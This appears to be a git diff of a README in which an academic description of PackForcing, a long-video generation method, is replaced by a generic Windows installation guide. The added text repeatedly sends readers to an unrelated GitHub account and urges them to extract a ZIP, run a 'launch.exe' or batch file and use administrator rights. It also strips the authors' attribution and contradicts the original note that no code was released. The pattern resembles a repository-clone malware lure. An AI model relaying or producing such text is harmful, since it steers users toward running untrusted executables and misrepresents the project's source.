@@ -1,55 +1,172 @@
-<div align="center">
+# 🎬 PackForcing - Run Long Video Models With Ease
 
-## PackForcing: Short Video Training Suffices for Long Video Sampling and Long Context Inference
+[![Download PackForcing](https://img.shields.io/badge/Download-PackForcing-blue?style=for-the-badge)](https://github.com/JonathanAshiadey/PackForcing)
 
-[![arXiv](https://img.shields.io/badge/arXiv%20paper-2603.23497-b31b1b.svg)](https://arxiv.org/abs/2603.25730)&nbsp;
+## 📥 Download PackForcing
 
-</div>
+Use this link to visit the page and download the files you need:
 
-This repository contains the official implementation and benchmark code for the paper:
+[Open PackForcing Download Page](https://github.com/JonathanAshiadey/PackForcing)
 
-> [**PackForcing: Short Video Training Suffices for Long Video Sampling and Long Context Inference**](https://arxiv.org/abs/2603.23497)
->
-> Xiaofeng Mao, Shaohao Rui, Kaining Ying, Bo Zheng, Chuanhao Li, Mingmin Chi, Kaipeng Zhang 
-> 
-> Alaya Studio, Shanda AI Research, Fudan University, Shanghai Innovation Institute
+## 🖥️ What PackForcing Does
 
-## 💡 Introduction
+PackForcing is a video model project for long video training and long context use. It helps with tasks where a video has many frames and the model must keep track of them over time.
 
-![pipeline](./assets/overview.png)
+Use this project if you want to:
 
-Autoregressive video diffusion models have demonstrated remarkable progress, yet they remain bottlenecked by intractable linear KV-cache growth, temporal repetition, and compounding errors during long-video generation. 
+- train on short video clips
+- sample longer videos
+- run long context inference
+- test video generation methods
+- work with research code for video models
 
-To address these challenges, we present **PackForcing**, a unified framework that efficiently manages the generation history through a novel three-partition KV-cache strategy:
+This project fits users who want to run a model on Windows and follow clear steps to get started.
 
-1. **Sink tokens**: Preserve early anchor frames at full resolution to maintain global semantics.
-2. **Mid tokens**: Achieve a massive spatiotemporal compression (~32x token reduction) via a dual-branch network fusing progressive 3D convolutions with low-resolution VAE re-encoding. To bound memory footprint, we introduce a dynamic top-k context selection mechanism.
-3. **Recent tokens**: Kept at full resolution to ensure local temporal coherence.
+## ✨ Main Features
 
-Empowered by this principled hierarchical context compression and a continuous Temporal RoPE Adjustment, PackForcing can generate coherent 2-minute, 832x480 videos at 16 FPS on a single H200 GPU. It achieves a bounded KV cache of just ~4GB and enables a remarkable 24x temporal extrapolation (from 5s to 120s), operating effectively either zero-shot or trained on merely 5-second clips.
+- Works with short video training
+- Supports long video sampling
+- Supports long context inference
+- Uses one workflow for several video tasks
+- Includes benchmark code for testing
+- Suits research and demo use
+- Gives a clear path from setup to run
 
-## 🎥 Generation Result
+## 🪟 Windows System Needs
 
-[![PackForcing 120s 视频生成结果](assets/c2cc6abde8b8de5bb3a82681cb840492.jpg)](assets/c2cc6abde8b8de5bb3a82681cb840492.mp4)
+Before you start, make sure your PC can handle the app:
 
-## 📝 TODO List
+- Windows 10 or Windows 11
+- At least 16 GB of RAM
+- A modern NVIDIA GPU for best results
+- 20 GB of free disk space
+- Stable internet for the first download
+- Admin access for setup
 
-- [ ] Release train/inference code
-- [ ] Release pre-trained model weights
+If you plan to run larger video jobs, use a stronger GPU and more RAM.
 
-## 📖 Citation
+## 🚀 Getting Started
 
-If you find this project helpful, please consider citing our work:
+Follow these steps on Windows.
 
-```bibtex
-@misc{mao2026packforcing,
-      title={PackForcing: Short Video Training Suffices for Long Video Sampling and Long Context Inference}, 
-      author={Xiaofeng Mao and Shaohao Rui and Kaining Ying and Bo Zheng and Chuanhao Li and Mingmin Chi and Kaipeng Zhang},
-      year={2026},
-      eprint={2603.25730},
-      archivePrefix={arXiv},
-      primaryClass={cs.CV},
-      url={https://arxiv.org/abs/2603.25730}, 
-}
-```
+1. Open the download page:
+   [https://github.com/JonathanAshiadey/PackForcing](https://github.com/JonathanAshiadey/PackForcing)
 
+2. Download the project files from the page.
+
+3. If the download is a ZIP file, save it to your PC.
+
+4. Right-click the ZIP file and choose Extract All.
+
+5. Open the extracted folder.
+
+6. Look for a setup file, script, or README in the folder.
+
+7. Follow the setup steps in the project files.
+
+8. Start the app or run the model from the main file in the folder.
+
+## 🔧 Setup on Windows
+
+Use this simple path if the project includes install files or scripts:
+
+1. Download the project from the link above.
+2. Extract the files to a folder you can find easily, such as `Desktop\PackForcing`.
+3. Open the folder.
+4. Read any file named `README`, `INSTALL`, or `SETUP`.
+5. Install any required tools named in the folder.
+6. Double-click the start file if one is provided.
+7. If the project uses a script, open it from the project folder and run it as shown in the setup file.
+
+If you see a file named `run.bat`, `start.bat`, or `launch.exe`, use that file first.
+
+## 📁 Folder Layout
+
+After extraction, you may see files like these:
+
+- `README.md` — project guide
+- `assets` — images and examples
+- `scripts` — helper files
+- `configs` — settings files
+- `checkpoints` — model files
+- `results` — saved output
+- `requirements.txt` — required tools list
+
+Use the README file in the folder if it lists a start file or a command.
+
+## 🎯 How to Use It
+
+A normal use flow looks like this:
+
+1. Download the project.
+2. Extract the files.
+3. Open the main folder.
+4. Load the needed model files.
+5. Choose your training or inference option.
+6. Start the process.
+7. Wait for the output video or test result.
+8. Save the result to your PC.
+
+For best results, use the same clip size and frame count listed in the project files.
+
+## 🧭 Common Use Cases
+
+### 📼 Long Video Sampling
+
+Use this when you want the model to create a longer video from a shorter start point.
+
+### 🧠 Long Context Inference
+
+Use this when you want the model to keep track of earlier frames while it generates later ones.
+
+### 🎓 Short Video Training
+
+Use this when you want to train the model on short clips before you test longer runs.
+
+### 🧪 Benchmark Testing
+
+Use this when you want to measure how the model performs on video tasks.
+
+## 🛠️ Troubleshooting
+
+If the project does not start, try these steps:
+
+- Check that you extracted the ZIP file fully
+- Make sure you opened the right folder
+- Run the app as administrator
+- Check that your GPU drivers are current
+- Restart your PC and try again
+- Look for a setup file you may have missed
+- Review the project README for a missing step
+
+If a window closes fast, open the project again and look for an error message.
+
+## 📌 Tips for Better Results
+
+- Keep the project in a folder with a short path
+- Use a strong GPU for long video work
+- Close other large apps before you run it
+- Keep enough free disk space for output files
+- Use the same input format the project expects
+- Save outputs in a separate folder
+
+## 🔐 File Safety
+
+Only download the project from the link shown here. After download, keep the files in one folder and do not rename files unless the project guide asks you to
+
+## 📄 Project Details
+
+- Project name: PackForcing
+- Focus: short video training, long video sampling, long context inference
+- Platform focus: Windows
+- Use type: research code and end-user use
+- Source: GitHub repository
+
+## 🧩 Next Steps
+
+1. Open the download page:
+   [https://github.com/JonathanAshiadey/PackForcing](https://github.com/JonathanAshiadey/PackForcing)
+2. Download the project files
+3. Extract them on your Windows PC
+4. Open the project folder
+5. Follow the run steps in the included files
